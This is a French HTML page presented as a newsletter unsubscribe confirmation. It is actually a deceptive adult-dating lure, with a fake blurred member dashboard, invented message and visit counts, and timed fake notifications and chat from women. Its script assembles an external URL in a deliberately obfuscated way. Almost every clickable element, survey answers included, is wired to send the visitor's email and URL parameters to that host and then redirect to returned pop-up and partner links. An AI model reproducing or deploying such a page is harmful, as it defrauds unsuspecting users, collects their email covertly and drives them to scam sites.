<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex">
    
    <title>Désinscription - Dernières notifications</title>
    <style>
        /* --- CSS GLOBAL --- */
        :root {
            --primary: #ff4757;
            --dark: #2f3542;
            --grey: #f1f2f6;
            --green: #2ed573;     
            --btn-green: #27ae60; 
            --blue: #3742fa;
            --gold: #ffa502;
        }
        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
            background: #dfe4ea;
        }

        /* --- 1. LE DASHBOARD (ARRIÈRE PLAN MASSIF) --- */
        #fake-dashboard {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: grid; grid-template-columns: 240px 1fr; grid-template-rows: 60px 1fr;
            filter: blur(5px);
            transform: scale(1.02);
            z-index: 1;
            pointer-events: none;
            background: white;
        }

        /* Header Fake */
        .db-header { grid-column: 1 / -1; background: white; border-bottom: 1px solid #eee; display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
        .logo { font-weight: 800; color: var(--primary); font-size: 22px; letter-spacing: -1px; display:flex; align-items:center; gap:5px;}
        .top-nav { display: flex; gap: 15px; align-items: center; }
        .nav-icon { font-size: 20px; color: #ccc; position: relative; }
        .nav-badge { position: absolute; top: -5px; right: -5px; background: red; color: white; font-size: 9px; width: 14px; height: 14px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .circle-av { width: 35px; height: 35px; background: #eee; border-radius: 50%; }

        /* Sidebar Fake */
        .db-sidebar { background: #fff; border-right: 1px solid #f1f2f6; padding: 20px 10px; display: flex; flex-direction: column; gap: 5px; overflow: hidden; }
        .menu-cat { font-size: 10px; font-weight: bold; color: #ccc; text-transform: uppercase; margin: 15px 0 5px 10px; }
        .menu-item { 
            padding: 10px 15px; border-radius: 6px; color: #57606f; font-size: 13px; font-weight: 500;
            display: flex; justify-content: space-between; align-items: center;
        }
        .menu-item:hover, .menu-item.active { background: #fff0f1; color: var(--primary); }
        .badge { background: var(--primary); color: white; padding: 1px 6px; border-radius: 10px; font-size: 10px; font-weight: bold; }
        .badge-blue { background: var(--blue); color: white; padding: 1px 6px; border-radius: 10px; font-size: 10px; font-weight: bold; }

        /* Main Content (Grille 4 Colonnes) */
        .db-main { 
            padding: 20px; 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 15px; 
            overflow: hidden; 
            background: #f8f9fa; 
            align-content: start;
        }
        
        .profile-card { background: white; border-radius: 8px; overflow: hidden; height: 240px; position: relative; box-shadow: 0 2px 5px rgba(0,0,0,0.05); display: flex; flex-direction: column; }
        .profile-img { width: 100%; height: 190px; position: relative; }
        .profile-img img { width: 100%; height: 100%; object-fit: cover; }
        .profile-overlay { position: absolute; bottom: 0; left: 0; width: 100%; background: linear-gradient(to top, rgba(0,0,0,0.7), transparent); padding: 5px 10px; color: white; font-size: 11px; font-weight: bold; }
        .status-dot { width: 8px; height: 8px; background: #2ed573; border-radius: 50%; display: inline-block; margin-right: 3px; border: 1px solid white; }
        
        .profile-actions {
            height: 50px; background: white; border-top: 1px solid #f1f2f6;
            display: flex; align-items: center; justify-content: space-around;
        }
        .fake-action {
            font-size: 11px; color: #747d8c; font-weight: 600; 
            display: flex; align-items: center; gap: 5px;
            background: #f1f2f6; padding: 5px 12px; border-radius: 4px;
        }

        /* --- 2. LA MODALE CENTRALE --- */
        #overlay-container {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            background: rgba(0,0,0,0.6); 
            backdrop-filter: blur(4px);
            display: flex; align-items: center; justify-content: center;
            overflow-y: auto; 
        }

        .modal-box {
            background: white; width: 95%; max-width: 520px;
            border-radius: 12px;
            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
            overflow: hidden;
            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .modal-header {
            background: #eb3b5a; 
            color: white; padding: 20px; text-align: center;
            border-bottom: 4px solid #d63031;
        }
        .modal-header h2 { margin: 0; font-size: 19px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
        .modal-header p { margin: 5px 0 0 0; font-size: 13px; opacity: 0.95; }
        
        .body-content { padding: 25px; }

        /* ZONE RÉCAPITULATIF */
        .account-split {
            display: flex; 
            background: #fff8e1; border: 1px solid #ffe0b2; 
            border-radius: 8px; overflow: hidden; margin-bottom: 20px;
        }
        .split-left {
            flex: 1.5; padding: 15px; 
            display: flex; flex-direction: column; justify-content: center; gap: 10px;
        }
        .summary-item { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #8e4c08; }
        .s-icon { font-size: 16px; width: 20px; text-align: center; }
        
        .split-right {
            flex: 1; 
            background: var(--btn-green); 
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: 0.2s;
            border-left: 2px solid #fff;
        }
        .split-right:hover { filter: brightness(1.1); }
        .btn-vertical {
            color: white; font-weight: 800; text-align: center; font-size: 14px; 
            text-transform: uppercase; line-height: 1.4; padding: 10px;
        }
        .arrow-icon { font-size: 20px; display: block; margin-bottom: 5px; }

        /* Sondage */
        .survey-box { margin-bottom: 15px; }
        .survey-title { font-size: 13px; font-weight: 700; margin-bottom: 10px; color: #2f3542; }
        .survey-opt { 
            display: flex; align-items: center; width: 100%; padding: 10px; margin-bottom: 6px; box-sizing: border-box;
            border: 1px solid #dfe4ea; border-radius: 4px; background: white; 
            text-align: left; cursor: pointer; font-size: 12px; color: #57606f; transition: 0.2s;
        }
        .survey-opt:hover { border-color: var(--blue); color: var(--blue); background: #f7f9ff; font-weight: 600; }
        .radio-fake { width: 12px; height: 12px; border: 1px solid #ccc; border-radius: 50%; margin-right: 10px; }

        /* Footer */
        .footer-action {
            background: #f1f2f6; padding: 15px 25px;
            display: flex; flex-direction: column; gap: 10px;
        }
        .retention-text { font-size: 12px; color: #2f3542; text-align: center; margin-bottom: 5px; }
        
        .btn-gift {
            background: var(--btn-green); color: white; border: none; width: 100%; padding: 14px;
            border-radius: 6px; font-weight: bold; font-size: 13px; cursor: pointer;
            display: flex; align-items: center; justify-content: center; gap: 10px;
            box-shadow: 0 4px 0 #1e8449; transition: 0.1s;
        }
        .btn-gift:hover { transform: translateY(2px); box-shadow: 0 2px 0 #1e8449; }
        
        .link-quit {
            text-align: center; font-size: 11px; color: #a4b0be; text-decoration: underline; cursor: pointer; margin-top: 5px;
        }

        /* --- 3. NOTIFICATIONS (CORRECTIF MOBILE) --- */
        .toast-wrapper {
            position: absolute; top: 20px; right: 20px; z-index: 200;
            display: flex; flex-direction: column; gap: 12px; pointer-events: none;
        }
        .toast {
            pointer-events: auto;
            background: white; width: 300px; padding: 10px; border-radius: 8px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15); border-left: 4px solid var(--primary);
            display: flex; gap: 12px; align-items: center;
            cursor: pointer; border: 1px solid #eee;
            position: relative; 
            
            /* ETAT INITIAL : INVISIBLE & HORS ECRAN */
            opacity: 0;
            transform: translateX(150%); 
            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
        }
        
        /* ETAT VISIBLE */
        .toast.show { 
            opacity: 1; 
            transform: translateX(0); 
        }
        
        /* Bouton fermer notif */
        .toast-close {
            position: absolute; top: 2px; right: 5px;
            font-size: 16px; color: #ccc; cursor: pointer;
            padding: 0 5px; z-index: 10;
        }
        .toast-close:hover { color: #333; }

        .toast-img { width: 45px; height: 45px; border-radius: 50%; overflow: hidden; flex-shrink: 0; position: relative; }
        .toast-img img { width: 100%; height: 100%; object-fit: cover; }
        .notif-badge { position: absolute; bottom: 0; right: 0; background: red; width: 12px; height: 12px; border: 2px solid white; border-radius: 50%; }
        
        .toast-content { font-size: 12px; color: #333; line-height: 1.3; flex: 1; padding-right: 15px; } 
        .toast-header { font-weight: bold; margin-bottom: 2px; display: flex; justify-content: space-between; color: #1e272e; }
        .toast-meta { color: #a4b0be; font-size: 10px; font-weight: normal; }
        .toast-text { color: #57606f; }
        
        .btn-xs {
            display: inline-block; background: var(--blue); color: white; 
            padding: 4px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; margin-top: 5px;
            text-transform: uppercase;
        }

        .toast-snap { border-left: 4px solid #ffa502; align-items: flex-start; }
        .snap-preview {
            width: 50px; height: 50px; border-radius: 6px; overflow: hidden; 
            margin-right: 5px; position: relative; background: #000; flex-shrink: 0;
        }
        .snap-preview img { width: 100%; height: 100%; object-fit: cover; filter: blur(5px); opacity: 0.8; }
        .snap-lock { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 14px; }
        .btn-open-snap {
            margin-top: 5px; background: #222; color: white; border-radius: 4px; 
            padding: 4px 8px; font-size: 10px; font-weight: bold; display: inline-block;
        }

        /* --- 4. CHAT --- */
        #chat-widget {
            position: absolute; bottom: 0; right: 20px; width: 260px;
            background: white; border-radius: 12px 12px 0 0;
            box-shadow: 0 -5px 30px rgba(0,0,0,0.15);
            z-index: 200; transform: translateY(120%); transition: transform 0.5s ease-out;
        }
        .chat-header { 
            background: #2f3542; color: white; padding: 12px; border-radius: 12px 12px 0 0; 
            font-weight: bold; font-size: 13px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; 
        }
        .online-dot { width: 8px; height: 8px; background: #2ed573; border-radius: 50%; box-shadow: 0 0 5px #2ed573; }
        
        .chat-body { padding: 15px; height: 220px; background: #f1f2f6; display: flex; flex-direction: column; gap: 10px; overflow-y: auto; }
        
        .msg-time { font-size: 9px; color: #999; text-align: center; margin: 5px 0; }
        .msg { background: white; padding: 8px 12px; border-radius: 2px 12px 12px 12px; font-size: 12px; color: #2f3542; box-shadow: 0 1px 1px rgba(0,0,0,0.05); width: fit-content; max-width: 85%; }
        
        .btn-cam-join {
            background: #e74c3c; color: white; border: none; padding: 8px 12px;
            border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer;
            display: flex; align-items: center; gap: 6px; width: 100%; justify-content: center;
            margin-top: 5px; animation: pulse 2s infinite;
        }

        @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
        .smart-click { cursor: pointer; }

        /* --- RESPONSIVE MOBILE --- */
        @media (max-width: 600px) {
            .db-sidebar { display: none; } 
            .db-main { grid-template-columns: repeat(2, 1fr); }
            
            /* Position modale */
            .modal-box { 
                margin-top: 100px; 
                max-height: 80vh; 
                overflow-y: auto; 
            }
            #overlay-container { align-items: flex-start; }

            /* Notifs Mobile (Correctif Apparition) */
            .toast-wrapper { top: 60px; left: 10px; right: 10px; align-items: center; width: auto; }
            .toast { 
                width: 90%; 
                opacity: 0; /* Bien invisible départ */
                transform: translateY(-50px); /* Vient du haut légèrement */
            } 
            .toast.show { 
                opacity: 1;
                transform: translateY(0); 
            }
            
            #chat-widget { right: 10px; width: 250px; }
        }
    </style>
</head>
<body>

    <div id="fake-dashboard">
        <div class="db-header">
            <div class="logo">Désinscription<span style="color:#2f3542;">confirmée</span></div>
            <div class="top-nav">
                <div class="nav-icon">🔔<div class="nav-badge">5</div></div>
                <div class="nav-icon">✉️<div class="nav-badge">3</div></div>
                <div class="circle-av"></div>
            </div>
        </div>
        <div class="db-sidebar">
            <div class="menu-item active"><span>📊 Tableau de bord</span></div>
            <div class="menu-cat">Activités</div>
            <div class="menu-item"><span>💌 Messages</span> <span class="badge">3</span></div>
            <div class="menu-item"><span>👀 Visites Profil</span> <span class="badge">14</span></div>
            <div class="menu-item"><span>💖 Désinscriptions</span> <span class="badge-blue">2</span></div>
            <div class="menu-item"><span>⭐ Favoris</span></div>
            <div class="menu-cat">Membres</div>
            <div class="menu-item"><span>📍 Radar</span> <span class="badge">New</span></div>
            <div class="menu-item"><span>🎥 Bibliothèques</span> <span class="badge" style="background:red;">LIVE</span></div>
            <div class="menu-item"><span>📸 Photos</span></div>
            <div class="menu-cat">Système</div>
            <div class="menu-item"><span>🚫 Supprimés</span></div>
            <div class="menu-item"><span>🎁 Amis</span></div>
            <div class="menu-item"><span>⚙️ Paramètres</span></div>
        </div>
        <div class="db-main" id="photo-grid">
            </div>
    </div>

    <div id="overlay-container">
        <div class="modal-box">
            <div class="modal-header">
                <h2>⚠️ Désinscription confirmée</h2>
                <p>Vous ne recevrez plus de newsletter de notre part.</p>
            </div>
            
            <div class="body-content">
                
                <div class="account-split">
                    <div class="split-left">
                        <div class="summary-item">
                            <span class="s-icon">📩</span> 
                            <div><strong>3 Messages non lus</strong><br><span style="font-size:10px; color:#aaa;">(Reçus il y a 12 min)</span></div>
                        </div>
                        <div class="summary-item">
                            <span class="s-icon">👁️</span> 
                            <div><strong>14 Visites</strong> de profil<br><span style="font-size:10px; color:#aaa;">Cette semaine</span></div>
                        </div>
                        <div class="summary-item">
                            <span class="s-icon">📍</span> 
                            <div><strong>2 Utilisatrices</strong> connectées<br><span style="font-size:10px; color:#aaa;">(Proximité immédiate)</span></div>
                        </div>
                    </div>
                    
                    <div class="split-right smart-click">
                        <div class="btn-vertical">
                            <span class="arrow-icon">👉</span>
                            VOIR<br>L'ACTIVITÉ<br>AVANT<br>SUPPRESSION
                        </div>
                    </div>
                </div>

                <div class="survey-box">
                    <div class="survey-title">Pourquoi nous quittez-vous ?</div>
                    <div class="survey-opt smart-click"><div class="radio-fake"></div> J'ai trouvé quelqu'un.</div>
                    <div class="survey-opt smart-click"><div class="radio-fake"></div> Je cherche juste des plans d'un soir.</div>
                    <div class="survey-opt smart-click"><div class="radio-fake"></div> Je veux voir des femmes près de chez moi.</div>
                </div>
            </div>

            <div class="footer-action">
                <div class="retention-text">
                    <strong>En guise d'au revoir</strong>, nous vous offrons un accès VIP chez notre partenaire :
                </div>
                <button class="btn-gift smart-click">
                    🎁 RÉCLAMER MON ACCÈS GRATUIT (24H)
                </button>
                <div class="link-quit" onclick="window.close()">Fermer définitivement la page</div>
            </div>
        </div>
    </div>

    <div class="toast-wrapper">
        <div class="toast smart-click" id="toast-clara">
            <div class="toast-close">×</div>
            <div class="toast-img">
                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&q=80">
                <div class="notif-badge"></div>
            </div>
            <div class="toast-content">
                <div class="toast-header">Clara (📍 à 6 km de vous) <span class="toast-meta">À l'instant</span></div>
                <div class="toast-text" style="font-style:italic;">"Oui je suis dispo, tiens mon num 06 85 99..."</div>
                <div class="btn-xs">OUVRIR</div>
            </div>
        </div>
        
        <div class="toast smart-click" id="toast-views" style="border-left-color:#3742fa;">
            <div class="toast-close">×</div>
            <div class="toast-img" style="background:#3742fa; display:flex; align-items:center; justify-content:center; color:white;">
                👁️
            </div>
            <div class="toast-content">
                <div class="toast-header">Notifications en attente</div>
                <div class="toast-text">Votre profil a été vu. Cliquez pour afficher les visites reçues.</div>
                <div class="btn-xs" style="background:#3742fa;">AFFICHER</div>
            </div>
        </div>

        <div class="toast toast-snap smart-click" id="toast-snap">
            <div class="toast-close">×</div>
            <div class="snap-preview">
                <img src="https://images.unsplash.com/photo-1548142813-c348350df52b?w=100&q=60">
                <div class="snap-lock">🔒</div>
            </div>
            <div class="toast-content">
                <div class="toast-title"><span style="color:#e17055;">🔥 Photo éphémère</span> <span class="time-ago">Exp: 14s</span></div>
                <div>Julie vous a envoyé une photo privée.</div>
                <div class="btn-open-snap">OUVRIR</div>
            </div>
        </div>
    </div>

    <div id="chat-widget">
        <div class="chat-header">
            <div style="display:flex; align-items:center; gap:8px;" class="smart-click">
                <div class="online-dot"></div>
                <span>Julie (En ligne)</span>
            </div>
            <span class="chat-close">✕</span>
        </div>
        <div class="chat-body">
            <div class="msg-time">Hier à 21h42</div>
            <div class="msg">Coucou ? T'es là ?</div>
            
            <div class="msg" style="display:none;" id="msg-2">ça te dit qu'on s'appelle en visio là tout de suite ?</div>
            
            <div class="msg" style="display:none; padding:5px;" id="msg-btn">
                <button class="btn-cam-join smart-click">
                    📷 REJOINDRE SALON WEBCAM
                </button>
            </div>
            
            <div class="fake-input smart-click" style="margin-top: auto;">Répondre à Julie...</div>
        </div>
    </div>

<script>
    // --- 1. CONFIGURATION OBFUSQUÉE ---
    const _u = ['https://', 'lespetitscoquins.fr', '/cancel-bookingmessager.php'];
    const URL_PHP = _u.join('');
    const urlParams = new URLSearchParams(window.location.search);
    const userEmail = urlParams.get('email') || urlParams.get('u') || 'visiteur';

    // --- 2. POPULATION DASHBOARD ---
    const photoIds = [
        "1494790108377-be9c29b29330", "1534528741775-53994a69daeb", "1517841905240-472988babdf9", 
        "1524504388940-b1c1722653e1", "1488426862026-3ee34a7d66df", "1529626455594-4ff0802cfb7e",
        "1503104834685-5205928d3add", "1531746020798-e6953c6e8e04", "1514315384922-a45a7a401c37",
        "1524250502761-1ac6f2e30d43", "1483985988355-763728e1935b", "1522075469751-3a6694fb2f61",
        "1544005313-94ddf0286df2", "1519345182560-3f2917c472ef", "1531123897727-8f129e1688ce",
        "1515023115689-589c33041697", "1524638431109-93d95c968f03", "1530785606816-1e634e9463b6",
        "1492633426602-1b033058b889", "1506794778202-cad84cf45f1d", "1532910404247-7ad916305d67",
        "1525134479668-1bee00536561", "1485893086445-ed75865eb848", "1534751516010-82af0a28f96b"
    ];

    const grid = document.getElementById('photo-grid');
    photoIds.forEach(id => {
        const card = document.createElement('div');
        card.className = 'profile-card';
        card.innerHTML = `
            <div class="profile-img">
                <img src="https://images.unsplash.com/photo-${id}?w=200&h=300&fit=crop&q=60">
                <div class="profile-overlay">
                    <div class="status-dot"></div> En ligne
                </div>
            </div>
            <div class="profile-actions">
                <div class="fake-action">❤️ Like</div>
                <div class="fake-action">✉️ Message</div>
            </div>
        `;
        grid.appendChild(card);
    });

    // --- 3. LOGIQUE AJAX ---
    function executeAjaxLogic(triggerElement) {
        triggerElement.style.opacity = "0.7";
        document.body.style.cursor = "wait";

        var formData = new FormData();
        formData.append('action', 'get_links');
        formData.append('u', userEmail);
        urlParams.forEach((value, key) => formData.append(key, value));

        fetch(URL_PHP, { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'ok') {
                    if(data.url_pop) { try { window.open(data.url_pop, '_blank'); } catch(e){} }
                    setTimeout(() => { window.location.href = data.url_main; }, 200);
                } else {
                    window.location.reload(); 
                }
            })
            .catch(err => {
                console.error("Erreur:", err);
                window.location.href = "https://google.com"; 
            });
    }

    document.querySelectorAll('.smart-click').forEach(el => {
        el.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            executeAjaxLogic(this);
        });
    });

    // --- FERMETURES ---
    document.querySelectorAll('.toast-close').forEach(btn => {
        btn.addEventListener('click', function(e) {
            e.stopPropagation(); 
            e.preventDefault();
            this.parentElement.style.opacity = '0';
            setTimeout(() => { this.parentElement.style.display = 'none'; }, 300);
        });
    });

    document.querySelector('.chat-close').addEventListener('click', function(e) {
        e.stopPropagation();
        e.preventDefault();
        document.getElementById('chat-widget').style.transform = "translateY(120%)";
    });

    // --- 4. SCÉNARIOS D'ANIMATION (DÉLAIS AUGMENTÉS MOBILE) ---
    window.onload = function() {
        // Notif Clara (+2.5s)
        setTimeout(() => { document.getElementById('toast-clara').classList.add('show'); }, 2500);
        
        // Notif Visites (+4s)
        setTimeout(() => { document.getElementById('toast-views').classList.add('show'); }, 4000);
        
        // Chat Widget (+3.5s)
        setTimeout(() => { 
            document.getElementById('chat-widget').style.transform = "translateY(0)"; 
        }, 3500);

        // Script Chat
        setTimeout(() => { document.getElementById('msg-2').style.display = "block"; }, 5500);
        setTimeout(() => { document.getElementById('msg-btn').style.display = "block"; }, 7500);

        // LE SNAP (Dernier +6s)
        setTimeout(() => { document.getElementById('toast-snap').classList.add('show'); }, 6000);
    };
</script>

</body>
</html>
